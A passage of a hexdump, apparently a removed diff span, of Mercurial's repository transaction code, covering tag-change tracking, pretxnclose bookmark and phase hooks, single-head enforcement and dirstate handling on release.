-00015800: 7468 6520 666f 6c6c 6f77 696e 670a 2020  the following.  
-00015810: 2020 2020 2020 2320 646f 6375 6d65 6e74        # document
-00015820: 6174 696f 6e20 746f 2074 6865 2061 7070  ation to the app
-00015830: 726f 7072 6961 7465 2068 656c 7020 7365  ropriate help se
-00015840: 6374 696f 6e3a 0a20 2020 2020 2020 2023  ction:.        #
-00015850: 0a20 2020 2020 2020 2023 2054 6865 2060  .        # The `
-00015860: 6048 475f 5441 475f 4d4f 5645 4460 6020  `HG_TAG_MOVED`` 
-00015870: 7661 7269 6162 6c65 2077 696c 6c20 6265  variable will be
-00015880: 2073 6574 2069 6620 7468 6520 7472 616e   set if the tran
-00015890: 7361 6374 696f 6e20 746f 7563 6865 640a  saction touched.
-000158a0: 2020 2020 2020 2020 2320 7461 6773 2028          # tags (
-000158b0: 6e65 7720 6f72 2063 6861 6e67 6564 206f  new or changed o
-000158c0: 7220 6465 6c65 7465 6420 7461 6773 292e  r deleted tags).
-000158d0: 2049 6e20 6164 6469 7469 6f6e 2074 6865   In addition the
-000158e0: 2064 6574 6169 6c73 206f 660a 2020 2020   details of.    
-000158f0: 2020 2020 2320 7468 6573 6520 6368 616e      # these chan
-00015900: 6765 7320 6172 6520 6d61 6465 2061 7661  ges are made ava
-00015910: 696c 6162 6c65 2069 6e20 6120 6669 6c65  ilable in a file
-00015920: 2061 743a 0a20 2020 2020 2020 2023 2020   at:.        #  
-00015930: 2020 2060 6052 4550 4f52 4f4f 542f 2e68     ``REPOROOT/.h
-00015940: 672f 6368 616e 6765 732f 7461 6773 2e63  g/changes/tags.c
-00015950: 6861 6e67 6573 6060 2e0a 2020 2020 2020  hanges``..      
-00015960: 2020 2320 4d61 6b65 2073 7572 6520 796f    # Make sure yo
-00015970: 7520 6368 6563 6b20 666f 7220 4847 5f54  u check for HG_T
-00015980: 4147 5f4d 4f56 4544 2062 6566 6f72 6520  AG_MOVED before 
-00015990: 7265 6164 696e 6720 7468 6174 2066 696c  reading that fil
-000159a0: 6520 6173 2069 740a 2020 2020 2020 2020  e as it.        
-000159b0: 2320 6d69 6768 7420 6578 6973 7420 6672  # might exist fr
-000159c0: 6f6d 2061 2070 7265 7669 6f75 7320 7472  om a previous tr
-000159d0: 616e 7361 6374 696f 6e20 6576 656e 2069  ansaction even i
-000159e0: 6620 6e6f 2074 6167 2077 6572 6520 746f  f no tag were to
-000159f0: 7563 6865 640a 2020 2020 2020 2020 2320  uched.        # 
-00015a00: 696e 2074 6869 7320 6f6e 652e 2043 6861  in this one. Cha
-00015a10: 6e67 6573 2061 7265 2072 6563 6f72 6465  nges are recorde
-00015a20: 6420 696e 2061 206c 696e 6520 6261 7365  d in a line base
-00015a30: 2066 6f72 6d61 743a 3a0a 2020 2020 2020   format::.      
-00015a40: 2020 230a 2020 2020 2020 2020 2320 2020    #.        #   
-00015a50: 2020 3c61 6374 696f 6e3e 203c 6865 782d    <action> <hex-
-00015a60: 6e6f 6465 3e20 3c74 6167 2d6e 616d 653e  node> <tag-name>
-00015a70: 5c6e 0a20 2020 2020 2020 2023 0a20 2020  \n.        #.   
-00015a80: 2020 2020 2023 2041 6374 696f 6e73 2061       # Actions a
-00015a90: 7265 2064 6566 696e 6564 2061 7320 666f  re defined as fo
-00015aa0: 6c6c 6f77 3a0a 2020 2020 2020 2020 2320  llow:.        # 
-00015ab0: 2020 222d 5222 3a20 7461 6720 6973 2072    "-R": tag is r
-00015ac0: 656d 6f76 6564 2c0a 2020 2020 2020 2020  emoved,.        
-00015ad0: 2320 2020 222b 4122 3a20 7461 6720 6973  #   "+A": tag is
-00015ae0: 2061 6464 6564 2c0a 2020 2020 2020 2020   added,.        
-00015af0: 2320 2020 222d 4d22 3a20 7461 6720 6973  #   "-M": tag is
-00015b00: 206d 6f76 6564 2028 6f6c 6420 7661 6c75   moved (old valu
-00015b10: 6529 2c0a 2020 2020 2020 2020 2320 2020  e),.        #   
-00015b20: 222b 4d22 3a20 7461 6720 6973 206d 6f76  "+M": tag is mov
-00015b30: 6564 2028 6e65 7720 7661 6c75 6529 2c0a  ed (new value),.
-00015b40: 2020 2020 2020 2020 7472 6163 6b74 6167          tracktag
-00015b50: 7320 3d20 6c61 6d62 6461 2078 3a20 4e6f  s = lambda x: No
-00015b60: 6e65 0a20 2020 2020 2020 2023 2065 7870  ne.        # exp
-00015b70: 6572 696d 656e 7461 6c20 636f 6e66 6967  erimental config
-00015b80: 3a20 6578 7065 7269 6d65 6e74 616c 2e68  : experimental.h
-00015b90: 6f6f 6b2d 7472 6163 6b2d 7461 6773 0a20  ook-track-tags. 
-00015ba0: 2020 2020 2020 2073 686f 756c 6474 7261         shouldtra
-00015bb0: 636b 7461 6773 203d 2073 656c 662e 7569  cktags = self.ui
-00015bc0: 2e63 6f6e 6669 6762 6f6f 6c28 0a20 2020  .configbool(.   
-00015bd0: 2020 2020 2020 2020 2062 2765 7870 6572           b'exper
-00015be0: 696d 656e 7461 6c27 2c20 6227 686f 6f6b  imental', b'hook
-00015bf0: 2d74 7261 636b 2d74 6167 7327 0a20 2020  -track-tags'.   
-00015c00: 2020 2020 2029 0a20 2020 2020 2020 2069       ).        i
-00015c10: 6620 6465 7363 2021 3d20 6227 7374 7269  f desc != b'stri
-00015c20: 7027 2061 6e64 2073 686f 756c 6474 7261  p' and shouldtra
-00015c30: 636b 7461 6773 3a0a 2020 2020 2020 2020  cktags:.        
-00015c40: 2020 2020 6f6c 6468 6561 6473 203d 2073      oldheads = s
-00015c50: 656c 662e 6368 616e 6765 6c6f 672e 6865  elf.changelog.he
-00015c60: 6164 7265 7673 2829 0a0a 2020 2020 2020  adrevs()..      
-00015c70: 2020 2020 2020 6465 6620 7472 6163 6b74        def trackt
-00015c80: 6167 7328 7472 3229 3a0a 2020 2020 2020  ags(tr2):.      
-00015c90: 2020 2020 2020 2020 2020 7265 706f 203d            repo =
-00015ca0: 2072 6570 6f72 6566 2829 0a20 2020 2020   reporef().     
-00015cb0: 2020 2020 2020 2020 2020 2061 7373 6572             asser
-00015cc0: 7420 7265 706f 2069 7320 6e6f 7420 4e6f  t repo is not No
-00015cd0: 6e65 2020 2320 6865 6c70 2070 7974 7970  ne  # help pytyp
-00015ce0: 650a 2020 2020 2020 2020 2020 2020 2020  e.              
-00015cf0: 2020 6f6c 6466 6e6f 6465 7320 3d20 7461    oldfnodes = ta
-00015d00: 6773 6d6f 642e 666e 6f64 6572 6576 7328  gsmod.fnoderevs(
-00015d10: 7265 706f 2e75 692c 2072 6570 6f2c 206f  repo.ui, repo, o
-00015d20: 6c64 6865 6164 7329 0a20 2020 2020 2020  ldheads).       
-00015d30: 2020 2020 2020 2020 206e 6577 6865 6164           newhead
-00015d40: 7320 3d20 7265 706f 2e63 6861 6e67 656c  s = repo.changel
-00015d50: 6f67 2e68 6561 6472 6576 7328 290a 2020  og.headrevs().  
-00015d60: 2020 2020 2020 2020 2020 2020 2020 6e65                ne
-00015d70: 7766 6e6f 6465 7320 3d20 7461 6773 6d6f  wfnodes = tagsmo
-00015d80: 642e 666e 6f64 6572 6576 7328 7265 706f  d.fnoderevs(repo
-00015d90: 2e75 692c 2072 6570 6f2c 206e 6577 6865  .ui, repo, newhe
-00015da0: 6164 7329 0a20 2020 2020 2020 2020 2020  ads).           
-00015db0: 2020 2020 2023 206e 6f74 6573 3a20 7765       # notes: we
-00015dc0: 2063 6f6d 7061 7265 206c 6973 7473 2068   compare lists h
-00015dd0: 6572 652e 0a20 2020 2020 2020 2020 2020  ere..           
-00015de0: 2020 2020 2023 2041 7320 7765 2064 6f20       # As we do 
-00015df0: 6974 206f 6e6c 7920 6f6e 6365 2062 7569  it only once bui
-00015e00: 6469 6e67 2073 6574 2077 6f75 6c64 206e  ding set would n
-00015e10: 6f74 2062 6520 6368 6561 7065 720a 2020  ot be cheaper.  
-00015e20: 2020 2020 2020 2020 2020 2020 2020 6368                ch
-00015e30: 616e 6765 7320 3d20 7461 6773 6d6f 642e  anges = tagsmod.
-00015e40: 6469 6666 7461 6773 2872 6570 6f2e 7569  difftags(repo.ui
-00015e50: 2c20 7265 706f 2c20 6f6c 6466 6e6f 6465  , repo, oldfnode
-00015e60: 732c 206e 6577 666e 6f64 6573 290a 2020  s, newfnodes).  
-00015e70: 2020 2020 2020 2020 2020 2020 2020 6966                if
-00015e80: 2063 6861 6e67 6573 3a0a 2020 2020 2020   changes:.      
-00015e90: 2020 2020 2020 2020 2020 2020 2020 7472                tr
-00015ea0: 322e 686f 6f6b 6172 6773 5b62 2774 6167  2.hookargs[b'tag
-00015eb0: 5f6d 6f76 6564 275d 203d 2062 2731 270a  _moved'] = b'1'.
-00015ec0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00015ed0: 2020 2020 7769 7468 2072 6570 6f2e 7666      with repo.vf
-00015ee0: 7328 0a20 2020 2020 2020 2020 2020 2020  s(.             
-00015ef0: 2020 2020 2020 2020 2020 2062 2763 6861             b'cha
-00015f00: 6e67 6573 2f74 6167 732e 6368 616e 6765  nges/tags.change
-00015f10: 7327 2c20 6227 7727 2c20 6174 6f6d 6963  s', b'w', atomic
-00015f20: 7465 6d70 3d54 7275 650a 2020 2020 2020  temp=True.      
-00015f30: 2020 2020 2020 2020 2020 2020 2020 2920                ) 
-00015f40: 6173 2063 6861 6e67 6573 6669 6c65 3a0a  as changesfile:.
-00015f50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00015f60: 2020 2020 2020 2020 2320 6e6f 7465 3a20          # note: 
-00015f70: 7765 2064 6f20 6e6f 7420 7265 6769 7374  we do not regist
-00015f80: 6572 2074 6865 2066 696c 6520 746f 2074  er the file to t
-00015f90: 6865 2074 7261 6e73 6163 7469 6f6e 0a20  he transaction. 
-00015fa0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00015fb0: 2020 2020 2020 2023 2062 6563 6175 7365         # because
-00015fc0: 2077 6520 6e65 6564 7320 6974 2074 6f20   we needs it to 
-00015fd0: 7374 696c 6c20 6578 6973 7420 6f6e 2074  still exist on t
-00015fe0: 6865 2074 7261 6e73 6163 7469 6f6e 0a20  he transaction. 
-00015ff0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016000: 2020 2020 2020 2023 2069 7320 636c 6f73         # is clos
-00016010: 6520 2866 6f72 2074 786e 636c 6f73 6520  e (for txnclose 
-00016020: 686f 6f6b 7329 0a20 2020 2020 2020 2020  hooks).         
-00016030: 2020 2020 2020 2020 2020 2020 2020 2074                 t
-00016040: 6167 736d 6f64 2e77 7269 7465 6469 6666  agsmod.writediff
-00016050: 2863 6861 6e67 6573 6669 6c65 2c20 6368  (changesfile, ch
-00016060: 616e 6765 7329 0a0a 2020 2020 2020 2020  anges)..        
-00016070: 6465 6620 7661 6c69 6461 7465 2874 7232  def validate(tr2
-00016080: 293a 0a20 2020 2020 2020 2020 2020 2022  ):.            "
-00016090: 2222 7769 6c6c 2072 756e 2070 7265 2d63  ""will run pre-c
-000160a0: 6c6f 7369 6e67 2068 6f6f 6b73 2222 220a  losing hooks""".
-000160b0: 2020 2020 2020 2020 2020 2020 2320 5858              # XX
-000160c0: 5820 7468 6520 7472 616e 7361 6374 696f  X the transactio
-000160d0: 6e20 4150 4920 6973 2061 2062 6974 206c  n API is a bit l
-000160e0: 6163 6b69 6e67 2068 6572 6520 736f 2077  acking here so w
-000160f0: 6520 7461 6b65 2061 2068 6163 6b79 0a20  e take a hacky. 
-00016100: 2020 2020 2020 2020 2020 2023 2070 6174             # pat
-00016110: 6820 666f 7220 6e6f 770a 2020 2020 2020  h for now.      
-00016120: 2020 2020 2020 230a 2020 2020 2020 2020        #.        
-00016130: 2020 2020 2320 5765 2063 616e 6e6f 7420      # We cannot 
-00016140: 6164 6420 7468 6973 2061 7320 6120 2270  add this as a "p
-00016150: 656e 6469 6e67 2220 686f 6f6b 7320 7369  ending" hooks si
-00016160: 6e63 6520 7468 6520 2774 722e 686f 6f6b  nce the 'tr.hook
-00016170: 6172 6773 270a 2020 2020 2020 2020 2020  args'.          
-00016180: 2020 2320 6469 6374 2069 7320 636f 7069    # dict is copi
-00016190: 6564 2062 6566 6f72 6520 7468 6573 6520  ed before these 
-000161a0: 7275 6e2e 2049 6e20 6164 6469 7469 6f6e  run. In addition
-000161b0: 2077 6520 6e65 6564 7320 7468 6520 6461   we needs the da
-000161c0: 7461 0a20 2020 2020 2020 2020 2020 2023  ta.            #
-000161d0: 2061 7661 696c 6162 6c65 2074 6f20 696e   available to in
-000161e0: 206d 656d 6f72 7920 686f 6f6b 7320 746f   memory hooks to
-000161f0: 6f2e 0a20 2020 2020 2020 2020 2020 2023  o..            #
-00016200: 0a20 2020 2020 2020 2020 2020 2023 204d  .            # M
-00016210: 6f72 656f 7665 722c 2077 6520 616c 736f  oreover, we also
-00016220: 206e 6565 6420 746f 206d 616b 6520 7375   need to make su
-00016230: 7265 2074 6869 7320 7275 6e73 2062 6566  re this runs bef
-00016240: 6f72 6520 7478 6e63 6c6f 7365 0a20 2020  ore txnclose.   
-00016250: 2020 2020 2020 2020 2023 2068 6f6f 6b73           # hooks
-00016260: 2061 6e64 2074 6865 7265 2069 7320 6e6f   and there is no
-00016270: 2022 7065 6e64 696e 6722 206d 6563 6861   "pending" mecha
-00016280: 6e69 736d 2074 6861 7420 776f 756c 6420  nism that would 
-00016290: 6578 6563 7574 650a 2020 2020 2020 2020  execute.        
-000162a0: 2020 2020 2320 6c6f 6769 6320 6f6e 6c79      # logic only
-000162b0: 2069 6620 686f 6f6b 7320 6172 6520 6162   if hooks are ab
-000162c0: 6f75 7420 746f 2072 756e 2e0a 2020 2020  out to run..    
-000162d0: 2020 2020 2020 2020 230a 2020 2020 2020          #.      
-000162e0: 2020 2020 2020 2320 4669 7869 6e67 2074        # Fixing t
-000162f0: 6869 7320 6c69 6d69 7461 7469 6f6e 206f  his limitation o
-00016300: 6620 7468 6520 7472 616e 7361 6374 696f  f the transactio
-00016310: 6e20 6973 2061 6c73 6f20 6e65 6564 6564  n is also needed
-00016320: 2074 6f20 7472 6163 6b0a 2020 2020 2020   to track.      
-00016330: 2020 2020 2020 2320 6f74 6865 7220 6661        # other fa
-00016340: 6d69 6c69 6573 206f 6620 6368 616e 6765  milies of change
-00016350: 7320 2862 6f6f 6b6d 6172 6b73 2c20 7068  s (bookmarks, ph
-00016360: 6173 6573 2c20 6f62 736f 6c65 7363 656e  ases, obsolescen
-00016370: 6365 292e 0a20 2020 2020 2020 2020 2020  ce)..           
-00016380: 2023 0a20 2020 2020 2020 2020 2020 2023   #.            #
-00016390: 2054 6869 7320 7769 6c6c 2068 6176 6520   This will have 
-000163a0: 746f 2062 6520 6669 7865 6420 6265 666f  to be fixed befo
-000163b0: 7265 2077 6520 7265 6d6f 7665 2074 6865  re we remove the
-000163c0: 2065 7870 6572 696d 656e 7461 6c0a 2020   experimental.  
-000163d0: 2020 2020 2020 2020 2020 2320 6761 7469            # gati
-000163e0: 6e67 2e0a 2020 2020 2020 2020 2020 2020  ng..            
-000163f0: 7472 6163 6b74 6167 7328 7472 3229 0a20  tracktags(tr2). 
-00016400: 2020 2020 2020 2020 2020 2072 6570 6f20             repo 
-00016410: 3d20 7265 706f 7265 6628 290a 2020 2020  = reporef().    
-00016420: 2020 2020 2020 2020 6173 7365 7274 2072          assert r
-00016430: 6570 6f20 6973 206e 6f74 204e 6f6e 6520  epo is not None 
-00016440: 2023 2068 656c 7020 7079 7479 7065 0a0a   # help pytype..
-00016450: 2020 2020 2020 2020 2020 2020 7369 6e67              sing
-00016460: 6c65 6865 6164 6f70 7420 3d20 2862 2765  leheadopt = (b'e
-00016470: 7870 6572 696d 656e 7461 6c27 2c20 6227  xperimental', b'
-00016480: 7369 6e67 6c65 2d68 6561 642d 7065 722d  single-head-per-
-00016490: 6272 616e 6368 2729 0a20 2020 2020 2020  branch').       
-000164a0: 2020 2020 2073 696e 676c 6568 6561 6420       singlehead 
-000164b0: 3d20 7265 706f 2e75 692e 636f 6e66 6967  = repo.ui.config
-000164c0: 626f 6f6c 282a 7369 6e67 6c65 6865 6164  bool(*singlehead
-000164d0: 6f70 7429 0a20 2020 2020 2020 2020 2020  opt).           
-000164e0: 2069 6620 7369 6e67 6c65 6865 6164 3a0a   if singlehead:.
-000164f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016500: 7369 6e67 6c65 6865 6164 7375 6220 3d20  singleheadsub = 
-00016510: 7265 706f 2e75 692e 636f 6e66 6967 7375  repo.ui.configsu
-00016520: 626f 7074 696f 6e73 282a 7369 6e67 6c65  boptions(*single
-00016530: 6865 6164 6f70 7429 5b31 5d0a 2020 2020  headopt)[1].    
-00016540: 2020 2020 2020 2020 2020 2020 6163 636f              acco
-00016550: 756e 7463 6c6f 7365 6420 3d20 7369 6e67  untclosed = sing
-00016560: 6c65 6865 6164 7375 622e 6765 7428 0a20  leheadsub.get(. 
-00016570: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016580: 2020 2062 2261 6363 6f75 6e74 2d63 6c6f     b"account-clo
-00016590: 7365 642d 6865 6164 7322 2c20 4661 6c73  sed-heads", Fals
-000165a0: 650a 2020 2020 2020 2020 2020 2020 2020  e.              
-000165b0: 2020 290a 2020 2020 2020 2020 2020 2020    ).            
-000165c0: 2020 2020 6966 2073 696e 676c 6568 6561      if singlehea
-000165d0: 6473 7562 2e67 6574 2862 2270 7562 6c69  dsub.get(b"publi
-000165e0: 632d 6368 616e 6765 732d 6f6e 6c79 222c  c-changes-only",
-000165f0: 2046 616c 7365 293a 0a20 2020 2020 2020   False):.       
-00016600: 2020 2020 2020 2020 2020 2020 2066 696c               fil
-00016610: 7465 726e 616d 6520 3d20 6222 696d 6d75  tername = b"immu
-00016620: 7461 626c 6522 0a20 2020 2020 2020 2020  table".         
-00016630: 2020 2020 2020 2065 6c73 653a 0a20 2020         else:.   
-00016640: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016650: 2066 696c 7465 726e 616d 6520 3d20 6222   filtername = b"
-00016660: 7669 7369 626c 6522 0a20 2020 2020 2020  visible".       
-00016670: 2020 2020 2020 2020 2073 636d 7574 696c           scmutil
-00016680: 2e65 6e66 6f72 6365 7369 6e67 6c65 6865  .enforcesinglehe
-00016690: 6164 280a 2020 2020 2020 2020 2020 2020  ad(.            
-000166a0: 2020 2020 2020 2020 7265 706f 2c20 7472          repo, tr
-000166b0: 322c 2064 6573 632c 2061 6363 6f75 6e74  2, desc, account
-000166c0: 636c 6f73 6564 2c20 6669 6c74 6572 6e61  closed, filterna
-000166d0: 6d65 0a20 2020 2020 2020 2020 2020 2020  me.             
-000166e0: 2020 2029 0a20 2020 2020 2020 2020 2020     ).           
-000166f0: 2069 6620 686f 6f6b 2e68 6173 686f 6f6b   if hook.hashook
-00016700: 2872 6570 6f2e 7569 2c20 6227 7072 6574  (repo.ui, b'pret
-00016710: 786e 636c 6f73 652d 626f 6f6b 6d61 726b  xnclose-bookmark
-00016720: 2729 3a0a 2020 2020 2020 2020 2020 2020  '):.            
-00016730: 2020 2020 666f 7220 6e61 6d65 2c20 286f      for name, (o
-00016740: 6c64 2c20 6e65 7729 2069 6e20 736f 7274  ld, new) in sort
-00016750: 6564 280a 2020 2020 2020 2020 2020 2020  ed(.            
-00016760: 2020 2020 2020 2020 7472 2e63 6861 6e67          tr.chang
-00016770: 6573 5b62 2762 6f6f 6b6d 6172 6b73 275d  es[b'bookmarks']
-00016780: 2e69 7465 6d73 2829 0a20 2020 2020 2020  .items().       
-00016790: 2020 2020 2020 2020 2029 3a0a 2020 2020           ):.    
-000167a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000167b0: 6172 6773 203d 2074 722e 686f 6f6b 6172  args = tr.hookar
-000167c0: 6773 2e63 6f70 7928 290a 2020 2020 2020  gs.copy().      
-000167d0: 2020 2020 2020 2020 2020 2020 2020 6172                ar
-000167e0: 6773 2e75 7064 6174 6528 626f 6f6b 6d61  gs.update(bookma
-000167f0: 726b 732e 7072 6570 6172 6568 6f6f 6b61  rks.preparehooka
-00016800: 7267 7328 6e61 6d65 2c20 6f6c 642c 206e  rgs(name, old, n
-00016810: 6577 2929 0a20 2020 2020 2020 2020 2020  ew)).           
-00016820: 2020 2020 2020 2020 2072 6570 6f2e 686f           repo.ho
-00016830: 6f6b 280a 2020 2020 2020 2020 2020 2020  ok(.            
-00016840: 2020 2020 2020 2020 2020 2020 6227 7072              b'pr
-00016850: 6574 786e 636c 6f73 652d 626f 6f6b 6d61  etxnclose-bookma
-00016860: 726b 272c 0a20 2020 2020 2020 2020 2020  rk',.           
-00016870: 2020 2020 2020 2020 2020 2020 2074 6872               thr
-00016880: 6f77 3d54 7275 652c 0a20 2020 2020 2020  ow=True,.       
-00016890: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000168a0: 202a 2a70 7963 6f6d 7061 742e 7374 726b   **pycompat.strk
-000168b0: 7761 7267 7328 6172 6773 290a 2020 2020  wargs(args).    
-000168c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000168d0: 290a 2020 2020 2020 2020 2020 2020 6966  ).            if
-000168e0: 2068 6f6f 6b2e 6861 7368 6f6f 6b28 7265   hook.hashook(re
-000168f0: 706f 2e75 692c 2062 2770 7265 7478 6e63  po.ui, b'pretxnc
-00016900: 6c6f 7365 2d70 6861 7365 2729 3a0a 2020  lose-phase'):.  
-00016910: 2020 2020 2020 2020 2020 2020 2020 636c                cl
-00016920: 203d 2072 6570 6f2e 756e 6669 6c74 6572   = repo.unfilter
-00016930: 6564 2829 2e63 6861 6e67 656c 6f67 0a20  ed().changelog. 
-00016940: 2020 2020 2020 2020 2020 2020 2020 2066                 f
-00016950: 6f72 2072 6576 732c 2028 6f6c 642c 206e  or revs, (old, n
-00016960: 6577 2920 696e 2074 722e 6368 616e 6765  ew) in tr.change
-00016970: 735b 6227 7068 6173 6573 275d 3a0a 2020  s[b'phases']:.  
-00016980: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016990: 2020 666f 7220 7265 7620 696e 2072 6576    for rev in rev
-000169a0: 733a 0a20 2020 2020 2020 2020 2020 2020  s:.             
-000169b0: 2020 2020 2020 2020 2020 2061 7267 7320             args 
-000169c0: 3d20 7472 2e68 6f6f 6b61 7267 732e 636f  = tr.hookargs.co
-000169d0: 7079 2829 0a20 2020 2020 2020 2020 2020  py().           
-000169e0: 2020 2020 2020 2020 2020 2020 206e 6f64               nod
-000169f0: 6520 3d20 6865 7828 636c 2e6e 6f64 6528  e = hex(cl.node(
-00016a00: 7265 7629 290a 2020 2020 2020 2020 2020  rev)).          
-00016a10: 2020 2020 2020 2020 2020 2020 2020 6172                ar
-00016a20: 6773 2e75 7064 6174 6528 7068 6173 6573  gs.update(phases
-00016a30: 2e70 7265 7061 7265 686f 6f6b 6172 6773  .preparehookargs
-00016a40: 286e 6f64 652c 206f 6c64 2c20 6e65 7729  (node, old, new)
-00016a50: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
-00016a60: 2020 2020 2020 2020 2020 7265 706f 2e68            repo.h
-00016a70: 6f6f 6b28 0a20 2020 2020 2020 2020 2020  ook(.           
-00016a80: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016a90: 2062 2770 7265 7478 6e63 6c6f 7365 2d70   b'pretxnclose-p
-00016aa0: 6861 7365 272c 0a20 2020 2020 2020 2020  hase',.         
-00016ab0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016ac0: 2020 2074 6872 6f77 3d54 7275 652c 0a20     throw=True,. 
-00016ad0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016ae0: 2020 2020 2020 2020 2020 202a 2a70 7963             **pyc
-00016af0: 6f6d 7061 742e 7374 726b 7761 7267 7328  ompat.strkwargs(
-00016b00: 6172 6773 290a 2020 2020 2020 2020 2020  args).          
-00016b10: 2020 2020 2020 2020 2020 2020 2020 290a                ).
-00016b20: 0a20 2020 2020 2020 2020 2020 2072 6570  .            rep
-00016b30: 6f2e 686f 6f6b 280a 2020 2020 2020 2020  o.hook(.        
-00016b40: 2020 2020 2020 2020 6227 7072 6574 786e          b'pretxn
-00016b50: 636c 6f73 6527 2c20 7468 726f 773d 5472  close', throw=Tr
-00016b60: 7565 2c20 2a2a 7079 636f 6d70 6174 2e73  ue, **pycompat.s
-00016b70: 7472 6b77 6172 6773 2874 722e 686f 6f6b  trkwargs(tr.hook
-00016b80: 6172 6773 290a 2020 2020 2020 2020 2020  args).          
-00016b90: 2020 290a 0a20 2020 2020 2020 2064 6566    )..        def
-00016ba0: 2072 656c 6561 7365 666e 2874 722c 2073   releasefn(tr, s
-00016bb0: 7563 6365 7373 293a 0a20 2020 2020 2020  uccess):.       
-00016bc0: 2020 2020 2072 6570 6f20 3d20 7265 706f       repo = repo
-00016bd0: 7265 6628 290a 2020 2020 2020 2020 2020  ref().          
-00016be0: 2020 6966 2072 6570 6f20 6973 204e 6f6e    if repo is Non
-00016bf0: 653a 0a20 2020 2020 2020 2020 2020 2020  e:.             
-00016c00: 2020 2023 2049 6620 7468 6520 7265 706f     # If the repo
-00016c10: 2068 6173 2062 6565 6e20 4743 2764 2028   has been GC'd (
-00016c20: 616e 6420 7468 6973 2072 656c 6561 7365  and this release
-00016c30: 2066 756e 6374 696f 6e20 6973 2062 6569   function is bei
-00016c40: 6e67 0a20 2020 2020 2020 2020 2020 2020  ng.             
-00016c50: 2020 2023 2063 616c 6c65 6420 6672 6f6d     # called from
-00016c60: 2074 7261 6e73 6163 7469 6f6e 2e5f 5f64   transaction.__d
-00016c70: 656c 5f5f 292c 2074 6865 7265 2773 206e  el__), there's n
-00016c80: 6f74 206d 7563 6820 7765 2063 616e 2064  ot much we can d
-00016c90: 6f2c 0a20 2020 2020 2020 2020 2020 2020  o,.             
-00016ca0: 2020 2023 2073 6f20 6a75 7374 206c 6561     # so just lea
-00016cb0: 7665 2074 6865 2075 6e66 696e 6973 6865  ve the unfinishe
-00016cc0: 6420 7472 616e 7361 6374 696f 6e20 7468  d transaction th
-00016cd0: 6572 6520 616e 6420 6c65 7420 7468 650a  ere and let the.
-00016ce0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00016cf0: 2320 7573 6572 2072 756e 2060 6867 2072  # user run `hg r
-00016d00: 6563 6f76 6572 602e 0a20 2020 2020 2020  ecover`..       
-00016d10: 2020 2020 2020 2020 2072 6574 7572 6e0a           return.
-00016d20: 2020 2020 2020 2020 2020 2020 6966 2073              if s
-00016d30: 7563 6365 7373 3a0a 2020 2020 2020 2020  uccess:.        
-00016d40: 2020 2020 2020 2020 2320 7468 6973 2073          # this s
-00016d50: 686f 756c 6420 6265 2065 7870 6c69 6369  hould be explici
-00016d60: 746c 7920 696e 766f 6b65 6420 6865 7265  tly invoked here
-00016d70: 2c20 6265 6361 7573 650a 2020 2020 2020  , because.      
-00016d80: 2020 2020 2020 2020 2020 2320 696e 2d6d            # in-m
-00016d90: 656d 6f72 7920 6368 616e 6765 7320 6172  emory changes ar
-00016da0: 656e 2774 2077 7269 7474 656e 206f 7574  en't written out
-00016db0: 2061 7420 636c 6f73 696e 670a 2020 2020   at closing.    
-00016dc0: 2020 2020 2020 2020 2020 2020 2320 7472              # tr
-00016dd0: 616e 7361 6374 696f 6e2c 2069 6620 7472  ansaction, if tr
-00016de0: 2e61 6464 6669 6c65 6765 6e65 7261 746f  .addfilegenerato
-00016df0: 7220 2876 6961 0a20 2020 2020 2020 2020  r (via.         
-00016e00: 2020 2020 2020 2023 2064 6972 7374 6174         # dirstat
-00016e10: 652e 7772 6974 6520 6f72 2073 6f29 2069  e.write or so) i
-00016e20: 736e 2774 2069 6e76 6f6b 6564 2077 6869  sn't invoked whi
-00016e30: 6c65 0a20 2020 2020 2020 2020 2020 2020  le.             
-00016e40: 2020 2023 2074 7261 6e73 6163 7469 6f6e     # transaction
-00016e50: 2072 756e 6e69 6e67 0a20 2020 2020 2020   running.       
-00016e60: 2020 2020 2020 2020 2072 6570 6f2e 6469           repo.di
-00016e70: 7273 7461 7465 2e77 7269 7465 284e 6f6e  rstate.write(Non
-00016e80: 6529 0a20 2020 2020 2020 2020 2020 2065  e).            e
-00016e90: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
-00016ea0: 2020 2020 2023 2064 6973 6361 7264 2061       # discard a
-00016eb0: 6c6c 2063 6861 6e67 6573 2028 696e 636c  ll changes (incl
-00016ec0: 7564 696e 6720 6f6e 6573 2061 6c72 6561  uding ones alrea
-00016ed0: 6479 2077 7269 7474 656e 0a20 2020 2020  dy written.     
-00016ee0: 2020 2020 2020 2020 2020 2023 206f 7574             # out
-00016ef0: 2920 696e 2074 6869 7320 7472 616e 7361  ) in this transa
-00016f00: 6374 696f 6e0a 2020 2020 2020 2020 2020  ction.          
-00016f10: 2020 2020 2020 7265 706f 2e69 6e76 616c        repo.inval
-00016f20: 6964 6174 6528 636c 6561 7266 696c 6563  idate(clearfilec
-00016f30: 6163 6865 3d54 7275 6529 0a0a 2020 2020  ache=True)..    
-00016f40: 2020 2020 7472 203d 2074 7261 6e73 6163      tr = transac
-00016f50: 7469 6f6e 2e74 7261 6e73 6163 7469 6f6e  tion.transaction
-00016f60: 280a 2020 2020 2020 2020 2020 2020 7270  (.            rp
-00016f70: 2c0a 2020 2020 2020 2020 2020 2020 7365  ,.            se
-00016f80: 6c66 2e73 7666 732c 0a20 2020 2020 2020  lf.svfs,.       
-00016f90: 2020 2020 2076 6673 6d61 702c 0a20 2020       vfsmap,.   
-00016fa0: 2020 2020 2020 2020 2062 226a 6f75 726e           b"journ
-00016fb0: 616c 222c 0a20 2020 2020 2020 2020 2020  al",.           
-00016fc0: 2062 2275 6e64 6f22 2c0a 2020 2020 2020   b"undo",.      
